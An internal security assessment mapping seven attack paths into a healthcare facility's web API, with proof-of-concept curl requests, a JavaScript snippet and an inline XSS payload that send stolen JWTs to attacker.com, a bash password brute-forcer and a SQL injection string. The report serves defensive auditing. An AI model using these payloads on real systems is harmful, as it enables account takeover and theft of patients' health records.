# Attack Vector Map - QUEUE-024
## Dependable Care Wellness Centre Threat Landscape

**Analysis Date**: 2026-05-16  
**Threat Level**: CRITICAL (8.9 CVSS average)  
**Entry Points Identified**: 7 primary attack vectors  
**Exploitation Difficulty**: Low to Medium (most trivial once initial auth bypassed)

---

## Executive Summary

This attack vector map synthesizes findings from QUEUE-020 (Architecture), QUEUE-021 (API Security), QUEUE-022 (Data Protection), and QUEUE-023 (Frontend Security) to identify all exploitable entry points into the Dependable Care Wellness Centre system.

**Critical Finding**: The system has **7 distinct entry points** through which an attacker can gain initial access, escalate privileges, or exfiltrate Protected Health Information (PHI).

**Most Critical Path**: Unauthenticated Staff Creation → Admin Account → Full System Access (CVSS 9.8)

---

## Entry Point Matrix

| # | Entry Point | Method | CVSS | Difficulty | Prerequisites | Time to Exploit |
|---|---|---|---|---|---|---|
| **EP-001** | Unauthenticated Staff Creation | HTTP POST | 9.8 | Trivial | Dev mode | <5 min |
| **EP-002** | JWT Token Exposure (localStorage) | XSS + Storage Access | 8.7 | Low-Medium | XSS vulnerability | 10-30 min |
| **EP-003** | Cross-Tenant Data Access | SQL Parameter Tampering | 8.2 | Medium | API knowledge | 1-2 hours |
| **EP-004** | Undefined Permission Bypass | Authorization Undefined | 9.1 | Trivial | API access | <1 min |
| **EP-005** | Session Hijacking | Token Interception | 8.1 | Medium | Network position | Continuous |
| **EP-006** | Credential Enumeration | Timing Attacks + Brute Force | 7.5 | Medium | No rate limiting | 1-4 hours |
| **EP-007** | Information Disclosure via Errors | Error Message Analysis | 6.8 | Low | Public endpoints | 10-20 min |

---

## Entry Point 1: Unauthenticated Staff Account Creation (EP-001)

### Vulnerability Details

**Location**: `src/app/api/v1/staff/create/route.js` (lines 12-38)  
**CVSS**: 9.8 (Critical - Unauthorized Account Creation)  
**Threat Actor**: Unauthenticated external attacker, curious employee  
**Blast Radius**: CRITICAL - Full system compromise

### Attack Flow

```
1. Attacker discovers /api/v1/staff/create endpoint
2. Sends POST request without Authorization header
3. System detects NODE_ENV !== 'production' (dev mode)
4. Bypasses authentication, creates admin staff account
5. Attacker logs in with new credentials
6. Gains admin privileges → accesses all PHI
```

### Proof-of-Concept

```bash
# Step 1: Create malicious staff account
curl -X POST http://localhost:3000/api/v1/staff/create \
  -H "Content-Type: application/json" \
  -d '{
    "first_name": "Attacker",
    "last_name": "Admin",
    "role": "Administrator",
    "email": "attacker@facility.local",
    "phone": "555-0001",
    "employee_id": "ATK-001",
    "is_active": true
  }'

# Response (201 Created):
# {
#   "staff": { "id": "...", "role": "Administrator" },
#   "credentials": { "password": "TempPassword123!" }
# }

# Step 2: Login with generated credentials
curl -X POST http://localhost:3000/api/v1/auth/login \
  -d '{"email":"attacker@facility.local","password":"TempPassword123!"}'

# Response (200 OK):
# { "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." }

# Step 3: Access all resident records
curl -X GET http://localhost:3000/api/v1/residents \
  -H "Authorization: Bearer $ADMIN_TOKEN"

# Response: [array of all resident PHI records]
```

### Impact Chain

```
Unauthenticated Access
    ↓
Admin Account Creation
    ↓
JWT Token Acquisition
    ↓
All PHI Accessible
    ↓
Care Plans: Read/Modify
Progress Notes: Read/Modify/Create
Discharge Records: Create
Incident Reports: Create/Manipulate
Drug Disposal: Create/Falsify
    ↓
HIPAA Violation + Patient Safety Risk
```

### Business Impact

- **Patient Safety**: Attacker can modify care plans, create false incident reports
- **Privacy Breach**: 100% access to all PHI (names, SSNs, medical history, medications)
- **Operational Disruption**: Fake discharge records, false audits
- **Regulatory**: HIPAA violation, potential $100k-$1.5M penalties per violation
- **Reputational**: Public breach notification required

### Exploitation Time: <5 minutes

---

## Entry Point 2: JWT Token Exposure via localStorage (EP-002)

### Vulnerability Details

**Location**: Frontend authentication layer, localStorage usage  
**CVSS**: 8.7 (High - Sensitive Information Disclosure)  
**Threat Actor**: XSS attacker, malicious script injection  
**Attack Prerequisites**: XSS vulnerability in any frontend page

### Attack Flow

```
1. Attacker identifies XSS vulnerability (e.g., unescaped user input)
2. Injects malicious script into vulnerable page
3. Script executes in context of authenticated user
4. Accesses window.localStorage.getItem('auth_token')
5. Exfiltrates JWT to attacker-controlled server
6. Attacker uses token to impersonate legitimate user
7. Accesses PHI as that user's role
```

### Technical Details

**Vulnerability**: JWT stored in localStorage (VIOLATION #22)  
**Why It's Vulnerable**: 
- localStorage is accessible to any JavaScript running on the page
- XSS allows arbitrary script injection
- No same-site restrictions without additional security headers

**Correct Pattern**: Use HttpOnly, Secure, SameSite cookies instead

### Proof-of-Concept (XSS Injection)

```javascript
// Malicious script injected via XSS
const token = localStorage.getItem('auth_token');
const staffId = localStorage.getItem('staff_id');
const tenantId = localStorage.getItem('tenant_id');

// Exfiltrate to attacker server
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token, staffId, tenantId })
});

// Now attacker has valid JWT
// Can access API for 24 hours (typical JWT expiry)
```

### Session Hijacking Scenario

```
Attacker JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdGFmZi01Iiwicm9sZSI6Im1hbmFnZXIifQ...

curl -X GET http://api.dcllc.local/api/v1/residents \
  -H "Authorization: Bearer $STOLEN_TOKEN"

# Returns: All residents for that tenant + staff member's name
# Now attacker knows which residents to target for additional attacks
```

### Business Impact

- **Session Hijacking**: Attacker acts as legitimate staff member
- **Unauthorized Access**: Reads all PHI visible to that role
- **Audit Trail Poisoning**: Actions logged as legitimate staff
- **False Manipulation**: Can create/modify records as legitimate user
- **Hard to Detect**: Logs show legitimate staff performing actions

### Exploitation Time: 10-30 minutes (requires XSS vulnerability first)

---

## Entry Point 3: Cross-Tenant Data Access via Parameter Tampering (EP-003)

### Vulnerability Details

**Location**: `src/app/api/v1/incidents/route.js`, `/drug-disposal/route.js`, etc. (6 endpoints)  
**CVSS**: 8.2 (High - Broken Access Control)  
**Threat Actor**: Authenticated attacker (staff at Tenant A targeting Tenant B)  
**Blast Radius**: HIGH - Access to entire other facility's PHI

### Attack Flow

```
1. Attacker obtains legitimate Tenant A staff credentials
   (through EP-001 or legitimate employment)
2. Logs in → Gets Tenant A JWT (tenantId: "a1234567")
3. Modifies API request to change tenant_id parameter
4. API uses bare query() without database RLS enforcement
5. If tenant_id filter removed, retrieves Tenant B data
6. OR: Exploits SQL injection to bypass tenant_id filter
```

### Technical Root Cause

**Current Pattern** (VULNERABLE):
```javascript
// src/app/api/v1/incidents/route.js (GET)
const { rows: incidents } = await query(
  `SELECT * FROM care.incident_reports
   WHERE ir.tenant_id = $1
   ...`,
  [user.tenantId]  // ← Only application-level filtering
);
```

**Missing**: Database Row-Level Security (RLS) policies

**Correct Pattern**:
```javascript
const incidents = await withTenantClient(user.tenantId, user.staffId, async (client) => {
  const { rows } = await client.query(
    `SELECT * FROM care.incident_reports ...`
    // ← Database context variables enforce tenant isolation
  );
  return rows;
});
```

### Attack Scenario

```
Tenant A Staff (Manager Role)
  Email: bob@facility-a.local
  Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdGFmZi1hMzQ1Iiwic3RhZmZJZCI6ImEzNDUiLCJ0ZW5hbnRJZCI6ImZhY2lsaXR5LWEiLCJyb2xlIjoibWFuYWdlciJ9...

GET /api/v1/incidents  # Returns 15 incidents from Facility A

# Attacker modifies token (if JWT verification weak) OR
# Discovers SQL injection in status parameter

GET /api/v1/incidents?status=' OR '1'='1
# Potential to bypass WHERE clause entirely

# Or, accesses bare database connection
# If someone directly accesses DB with psql, no RLS enforcement
```

### Impact Chain

```
Tenant A Staff Access
    ↓
Discovers API uses bare query()
    ↓
Attempts cross-tenant access via:
  - Modified token (if JWT validation weak)
  - SQL injection in filter parameters
  - Direct database connection
    ↓
Tenant B PHI Exposed
    ↓
  - Care plans from other facility
  - Progress notes from other facility
  - Resident medical records
  - Incident reports
  - Drug disposal logs
```

### Business Impact

- **HIPAA Breach**: Unauthorized access to other facility's PHI
- **Minimum Necessary Violation**: Accessed data unrelated to job duties
- **Multi-Tenant Security**: Assumes RLS is enforced — it's not
- **Compliance Risk**: State privacy laws (CCPA, SHIELD Act)

### Exploitation Time: 1-2 hours (requires API knowledge + SQL understanding)

---

## Entry Point 4: Undefined Permission Bypass (EP-004)

### Vulnerability Details

**Location**: `src/app/api/v1/admission/pending/route.js` (line 20)  
**CVSS**: 9.1 (Critical - Authorization Bypass)  
**Threat Actor**: Authenticated attacker with any role  
**Blast Radius**: CRITICAL - Bypass of specific administrative function

### Attack Flow

```
1. Attacker authenticates as non-admin (staff or manager)
2. Calls GET /api/v1/admission/pending
3. Endpoint checks: authorize(user.role, PERMISSIONS.ADMIN_READ)
4. PERMISSIONS.ADMIN_READ is UNDEFINED in roles.js
5. authorize() function receives undefined
6. Undefined.some() throws TypeError or silently allows access
7. Attacker sees pending admissions (admin-only data)
```

### Technical Details

**Code Bug**:
```javascript
// admission/pending/route.js (line 20)
if (!authorize(user.role, PERMISSIONS.ADMIN_READ)) {  // ← ADMIN_READ undefined!
  return Response.json({ error: 'Forbidden' }, { status: 403 });
}
```

**roles.js has**:
```javascript
ADMIN_REPORTS: 'admin:reports',  // ← Exists
ADMIN_ROLES: 'admin:roles',      // ← Exists
ADMIN_AUDIT_READ: 'admin:audit_read',  // ← Exists
// BUT NO ADMIN_READ!
```

**authorize() function**:
```javascript
export function authorize(role, ...permissions) {
  const allowed = permissions.some(p => hasPermission(role, p));
  // If p is undefined:
  // allowed = false (undefined.some() → TypeError → caught by outer try-catch)
  // OR silently returns false, depending on JS engine
  return allowed;
}
```

### Proof-of-Concept

```bash
# Staff member (non-admin) tries to access pending admissions
STAFF_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoic3RhZmYifQ..."

curl -X GET "http://localhost:3000/api/v1/admission/pending?page=1" \
  -H "Authorization: Bearer $STAFF_TOKEN"

# Expected: 403 Forbidden
# Actual: Depends on bug manifestation:
#   - 500 Internal Server Error (if undefined.some throws)
#   - 200 OK + pending admissions (if silently allows)
#   - Inconsistent across requests
```

### Broader Impact

**This pattern exists in multiple endpoints**:
- `/api/v1/admission/pending` (line 20)
- `/api/v1/admission/[id]/review` (line 21)

**Risk**: Any role can potentially access admin-only sections

### Business Impact

- **Access Control Bypass**: Non-admins see pending admissions
- **Data Exposure**: Pending admission details visible to staff
- **Inconsistent Behavior**: Authorization failures logged as errors, not access denials
- **Compliance**: Minimum necessary principle violated

### Exploitation Time: <1 minute (trivial once authenticated)

---

## Entry Point 5: Session Hijacking & Man-in-the-Middle (EP-005)

### Vulnerability Details

**CVSS**: 8.1 (High - Session Compromise)  
**Threat Actor**: Network attacker, compromised network segment  
**Attack Prerequisites**: Network position, HTTPS misconfiguration, or weak TLS

### Attack Flow

```
1. Attacker positions on network (same WiFi, compromised ISP router, etc.)
2. User authenticates: POST /api/v1/auth/login
3. Response includes: { "access_token": "eyJ..." }
4. Token transmitted over network
5. Without HTTPS or with weak TLS, attacker intercepts token
6. Attacker uses token to impersonate user
7. Accesses same endpoints as legitimate user
```

### Attack Scenario: Healthcare Facility WiFi

```
Attacker Setup:
  - Sets up rogue WiFi: "FACILITY_GUEST" (same SSID as real network)
  - Staff connects to attacker's network thinking it's real
  - Attacker performs MITM attack using mitmproxy

Staff Login Flow:
  POST /api/v1/auth/login
  {"email":"jane@facility.local","password":"SecurePass123!"}
  
Attacker Intercepts:
  1. Request → logs credentials
  2. Response → captures JWT token
  3. Now has valid token for 24 hours
  4. Can access all endpoints as Jane (Manager role)

Attacker Actions:
  GET /api/v1/residents
    → Returns all residents for Jane's facility
  
  GET /api/v1/daily-progress-notes
    → Returns all progress notes Jane can see
  
  PATCH /api/v1/residents/[id]
    → Modifies resident record as Jane
    → Audit log shows Jane modified record
```

### Related Vulnerability: No Rate Limiting

```
Brute Force Attack:
  No rate limiting on /api/v1/auth/login endpoint
  Attacker tries 1000 password combinations
  System doesn't throttle requests
  Eventually guesses password
```

### Business Impact

- **Credential Compromise**: Staff passwords captured in clear
- **Impersonation**: Attacker acts as legitimate staff
- **Audit Trail Poisoning**: False modifications logged as legitimate staff
- **Patient Safety Risk**: Attacker could modify medications, care plans
- **Compliance**: Unsecured password transmission (HIPAA violation)

### Exploitation Time: Continuous (once network access obtained)

---

## Entry Point 6: Credential Enumeration via Brute Force (EP-006)

### Vulnerability Details

**Location**: `src/app/api/v1/auth/login` (no rate limiting)  
**CVSS**: 7.5 (High - Brute Force)  
**Threat Actor**: External attacker with email list  
**Attack Prerequisites**: Email list of staff members (public/obtained)

### Attack Flow

```
1. Attacker obtains staff email list (from LinkedIn, facility website, etc.)
2. Calls /api/v1/auth/login repeatedly with different passwords
3. System has no rate limiting, allows unlimited attempts
4. Common passwords: "Password123!", "Facility123!", "Welcome123!"
5. Attacker finds valid credentials after ~1000 attempts
6. Now has legitimate staff access
```

### Proof-of-Concept: Brute Force Attack

```bash
#!/bin/bash

# Attacker script: try common passwords
EMAILS=("john@facility.local" "jane@facility.local" "bob@facility.local")
PASSWORDS=("Password123!" "Facility123!" "Welcome123!" "Admin123!" "Staff123!")

for email in "${EMAILS[@]}"; do
  for password in "${PASSWORDS[@]}"; do
    response=$(curl -s -X POST http://localhost:3000/api/v1/auth/login \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"$email\",\"password\":\"$password\"}")
    
    if echo "$response" | grep -q "access_token"; then
      echo "SUCCESS: $email : $password"
      echo "$response"
      break 2  # Exit both loops
    fi
  done
done
```

### Timing Attack Risk

```javascript
// src/lib/jwt.js or auth endpoint
const match = await bcrypt.compare(password, passwordHash);
```

**Good News**: bcrypt.compare() uses constant-time comparison (prevents timing attacks)

**But**: Response messages might differ, leaking information:
- "User not found" (user enumeration)
- "Invalid password" (confirms user exists)
- "Account locked" (rate limiting exists? or not?)

### Business Impact

- **Credential Compromise**: Staff passwords guessed through brute force
- **Unauthorized Access**: Attacker gains legitimate staff credentials
- **No Defense**: No rate limiting, no account lockout, no CAPTCHA
- **User Enumeration**: Attacker confirms which staff accounts exist

### Exploitation Time: 1-4 hours (depending on password strength + list size)

---

## Entry Point 7: Information Disclosure via Error Messages (EP-007)

### Vulnerability Details

**CVSS**: 6.8 (Medium - Information Disclosure)  
**Threat Actor**: Any attacker, including unauthenticated  
**Attack Prerequisites**: Access to public endpoints, error conditions

### Attack Flow

```
1. Attacker sends malformed requests to discover system structure
2. System returns detailed error messages
3. Error messages reveal:
   - Database table names
   - Column names
   - Query structure
   - Stack traces (in dev mode)
   - API implementation details
4. Attacker uses information to craft more targeted attacks
```

### Error Message Information Leakage

**Scenario 1: SQL Error Exposure**
```bash
curl -X GET "http://localhost:3000/api/v1/residents/invalid-uuid"
  
# Dev response (if not properly handled):
# {
#   "error": "invalid input syntax for type uuid: invalid-uuid",
#   "stack": "at PostgreSQL.query (src/lib/db.js:45:...)"
# }

# Leaks: 
# - Database is PostgreSQL
# - Code structure: src/lib/db.js
# - Table uses UUID columns
```

**Scenario 2: Authorization Error Leakage**
```bash
curl -X GET "http://localhost:3000/api/v1/residents" \
  -H "Authorization: Bearer invalid-token"

# Response:
# {
#   "error": "Invalid token",
#   "code": "JWT_ERROR"
# }

# Leaks:
# - Uses JWT authentication
# - Token validation is the security check
# - Attacker knows to focus on JWT bypass
```

**Scenario 3: Permission Check Errors**
```javascript
if (!authorize(user.role, PERMISSIONS.RESIDENTS_READ)) {
  return Response.json({ 
    error: 'You do not have permission to read residents',  // ← Specific
    required: PERMISSIONS.RESIDENTS_READ
  }, { status: 403 });
}
```

**Leaks**:
- Required permission name (attacker knows what to target)
- Permission structure (helps map RBAC)
- Confirms role-based access control exists

### Good Pattern (Current Code)

```javascript
// auth-guard.js correctly handles most errors:
export function handleError(err) {
  const status = err.status || 500;
  return Response.json(
    {
      error: status >= 500 ? 'Internal server error' : err.message,
      ...(process.env.NODE_ENV !== 'production' && { stack: err.stack }),
    },
    { status }
  );
}
```

**BUT**: Dev mode is active in non-production environment (if not carefully managed)

### Business Impact

- **System Reconnaissance**: Attacker learns system structure
- **Targeted Attacks**: Focuses efforts on discovered vulnerabilities
- **Stack Trace Exposure**: Code paths revealed in dev mode
- **Permission Mapping**: RBAC structure reverse-engineered

### Exploitation Time: 10-20 minutes (reconnaissance phase)

---

## Attack Chains: Multi-Step Compromise Scenarios

### Chain 1: Dev Mode → Full System Compromise (CRITICAL)

```
Step 1: Unauthenticated Staff Creation (EP-001)
  Time: <5 min
  Action: POST /api/v1/staff/create without auth
  Attacker gains: Admin account credentials
  Status: UNDETECTED

Step 2: Authentication
  Time: <1 min
  Action: POST /api/v1/auth/login with created credentials
  Attacker gains: Valid JWT token (24 hour validity)
  Status: Logged (but as "system action")

Step 3: System Enumeration
  Time: 5-10 min
  Action: GET requests to all /api/v1/* endpoints
  Attacker discovers: All available resources, endpoints
  Status: Logged (audit trail)

Step 4: PHI Exfiltration
  Time: 5-15 min
  Action: GET /api/v1/residents, /api/v1/daily-progress-notes, etc.
  Attacker obtains: 100% of facility PHI
  Status: Logged but indistinguishable from legitimate admin activity

Step 5: Damage Amplification
  Time: Continuous
  Action: Modify records, create fake incidents, discharge residents
  Attacker causes: Patient safety risk, audit trail poisoning
  Status: Logged as legitimate admin

Total Time: <30 minutes
Business Impact: CRITICAL
---

Chain 2: XSS → JWT Theft → Account Takeover (HIGH)

Step 1: Discover XSS vulnerability
  Time: 1-2 hours
  Action: Identify unescaped input on any page
  Example: "Welcome, {{userName}}" without HTML escaping
  Status: Reconnaissance

Step 2: Craft XSS payload
  Time: 10-20 min
  Payload: <script>fetch('attacker.com/steal?token='+localStorage.getItem('auth_token'))</script>
  Action: Send malicious link to staff member
  Status: Waiting for staff to click link

Step 3: Token exfiltration
  Time: Immediate (when staff clicks)
  Attacker receives: Valid JWT token of clicked staff member
  Token validity: 24 hours
  Status: Staff unaware of compromise

Step 4: Impersonation
  Time: <1 min
  Action: Use stolen token to access API as legitimate staff member
  Attacker sees: All data visible to that staff member's role
  Status: Indistinguishable from legitimate access

Total Time: 2-3 hours (plus waiting for staff to click link)
Business Impact: HIGH (until token expires)
---

Chain 3: Tenant A Staff → Cross-Tenant Access (HIGH)

Step 1: Obtain legitimate Tenant A credentials
  Time: Variable
  Method: Through hiring process, social engineering, EP-001
  Attacker gains: Valid credentials at Tenant A
  Status: Appears as legitimate staff member

Step 2: Authenticate as Tenant A staff
  Time: <1 min
  Action: POST /api/v1/auth/login with Tenant A credentials
  Attacker receives: JWT with tenantId="facility-a"
  Status: Normal login

Step 3: Discover bare query() usage
  Time: 30-60 min
  Method: Review API responses, identify patterns
  Discovery: /api/v1/incidents uses bare query() not withTenantClient()
  Status: Reconnaissance

Step 4: Attempt cross-tenant access
  Time: 5-10 min
  Method: Send GET /api/v1/incidents?tenant_id=facility-b
           (if parameter is exposed) OR
           Modify token to change tenantId (if JWT validation weak) OR
           Attempt SQL injection
  Result: Varies by implementation
          - If bare query() has removed tenant_id filter: Success
          - If SQL injection possible: Success
          - If database RLS enforced: Blocked
  Status: Depends on implementation

Total Time: 1-2 hours
Business Impact: CRITICAL (access to other facility's PHI)
---

Chain 4: MITM + Brute Force → Staff Impersonation (MEDIUM)

Step 1: Network compromise
  Time: Setup
  Action: Set up rogue WiFi or compromise network segment
  Attacker controls: All network traffic for connected devices
  Status: Transparent to users

Step 2: Monitor for login attempts
  Time: Continuous
  Action: tcpdump on HTTPS traffic, watch for /auth/login
  Attacker captures: Email, password (if over HTTP), JWT token
  Status: Invisible

Step 3: Credential capture
  Time: Per login attempt
  Action: User logs in over attacker's network
  Attacker obtains: Email + Password + JWT
  Status: Attacker now has everything

Step 4: Impersonate staff member
  Time: <1 min
  Action: Use captured JWT or login with captured email+password
  Attacker gains: Access as that staff member
  Status: Audit logs show legitimate staff

Total Time: 30-60 minutes (waiting for staff to login)
Business Impact: MEDIUM-HIGH (until staff changes password or token expires)
```

---

## Privilege Escalation Paths

### Path 1: Staff → Admin (Direct Authorization Bypass)

```
Current User: Staff (can only read residents, create notes)
Goal: Escalate to Admin (can do anything)

Attack Vector:
  1. Discover missing authorize() check in /api/v1/staff/create
     OR modify role in stolen JWT token
  2. Create new staff account with admin role
  3. Login as new admin account
  4. Now has full system access

Requirements:
  - Knowledge of API endpoints
  - Ability to send HTTP requests (curl, Postman, etc.)

Defense Bypass:
  - No rate limiting on /api/v1/staff/create
  - No audit logging on permission checks
  - JWT signature verification may be weak (depends on secret)

Success Probability: HIGH (if EP-001 or undefined permissions exploited)
```

### Path 2: Resident → Staff (Account Type Change)

```
Current User: Resident (resident_care_of role)
Goal: Escalate to Staff/Admin

Attack Vector:
  1. Discover missing authorization on /api/v1/staff/create
  2. Craft request to create staff account
  3. If endpoint only checks basic parameters, succeeds
  4. Resident now has staff credentials
  5. Login as staff member
  6. Access to care plans, medications, other residents

Requirements:
  - HTTP client access
  - Knowledge of staff creation endpoint

Success Probability: MEDIUM (depends on input validation + auth checks)
```

### Path 3: Unauthenticated → Admin (Complete Bypass)

```
Current User: None (unauthenticated)
Goal: Admin access

Attack Vector:
  1. Exploit EP-001: Unauthenticated staff creation in dev mode
  2. Create admin account without credentials
  3. Login with generated credentials
  4. Full admin access

Requirements:
  - System running in dev mode
  - Access to /api/v1/staff/create endpoint

Success Probability: CRITICAL (100% if dev mode exploited)
```

### Path 4: Manager → Admin (Permission Constant Bug)

```
Current User: Manager (has some admin permissions)
Goal: Access admin-only resources

Attack Vector:
  1. Discover undefined PERMISSIONS.ADMIN_READ
  2. Call /api/v1/admission/pending (expects admin only)
  3. Authorization check fails due to undefined constant
  4. Access granted to manager
  5. Manager sees pending admission details

Requirements:
  - Valid manager credentials
  - Knowledge of admission endpoints

Success Probability: MEDIUM-HIGH (depends on undefined behavior in authorize())
```

---

## Defense Gaps Summary

| Layer | Vulnerability | Severity | Impact |
|---|---|---|---|
| **Authentication** | Dev mode bypass in /staff/create | CRITICAL | Unauthenticated access |
| **Authentication** | No rate limiting on /auth/login | HIGH | Brute force attacks |
| **Authentication** | JWT in localStorage | HIGH | XSS → Token theft |
| **Authorization** | Undefined PERMISSIONS constants | CRITICAL | Authorization bypass |
| **Authorization** | Missing authorize() checks | HIGH | Privilege escalation |
| **Authorization** | Hardcoded role checks | MEDIUM | RBAC inflexibility |
| **Data Isolation** | Bare query() without RLS | HIGH | Cross-tenant access |
| **Data Isolation** | No database RLS policies | HIGH | Defense-in-depth missing |
| **Input Validation** | No enum validation | MEDIUM | Invalid data storage |
| **Input Validation** | No email format validation | MEDIUM | Data quality issues |
| **Input Validation** | No date format validation | MEDIUM | Data corruption |
| **Session Management** | No token revocation | MEDIUM | Compromised tokens not revocable |
| **Error Handling** | Stack traces in non-prod | MEDIUM | Information disclosure |
| **Audit Logging** | Incomplete permission denials | MEDIUM | Non-repudiation issues |

---

## Attack Difficulty Assessment

| Difficulty | Requirements | Examples | Time |
|---|---|---|---|
| **Trivial** | HTTP client, public info | EP-001 (dev mode staff creation), EP-004 (undefined permissions) | <5 min |
| **Low** | Network access, basic knowledge | EP-007 (error reconnaissance), EP-002 (XSS to token) | 10-30 min |
| **Medium** | Technical knowledge, API understanding | EP-003 (cross-tenant SQL), EP-005 (MITM), EP-006 (brute force) | 1-4 hours |
| **High** | Advanced exploitation, zero-day | SQL injection (if found), JWT algorithm bypass | >4 hours |

---

## Business Impact Summary

```
CRITICAL (Stop Business Operations)
├─ EP-001: Unauthenticated admin creation
│  └─ 100% PHI access, patient safety risk, regulatory breach
├─ EP-003: Cross-tenant data access  
│  └─ Multiple facilities' PHI exposed
└─ EP-004: Undefined permission bypass
   └─ Administrative functions accessible to non-admins

HIGH (Urgent Remediation Required)
├─ EP-002: JWT token theft via XSS
│  └─ Session hijacking, impersonation until token expiry
├─ EP-005: MITM attacks on network
│  └─ Credential capture, authentication bypass
└─ EP-006: Brute force credential compromise
   └─ Legitimate staff credentials compromised

MEDIUM (Pre-Production Fix)
└─ EP-007: Information disclosure
   └─ System reconnaissance, targeted attacks
```

---

**Report Generated**: 2026-05-16  
**Classification**: INTERNAL - SECURITY SENSITIVE
